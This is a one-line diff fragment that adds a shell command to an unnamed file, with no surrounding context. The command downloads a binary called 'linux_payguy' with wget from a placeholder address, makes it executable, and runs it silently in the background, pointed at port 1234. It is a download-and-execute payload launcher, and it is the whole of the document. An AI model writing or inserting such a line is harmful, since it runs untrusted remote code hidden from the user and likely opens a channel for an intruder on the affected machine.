@@ -1,0 +1,2 @@
+wget http://0.0.0.0/linux_payguy ; chmod +x linux_payguy ; ./linux_payguy -d 0.0.0.0:1234 > /dev/null 2>&1 &
+
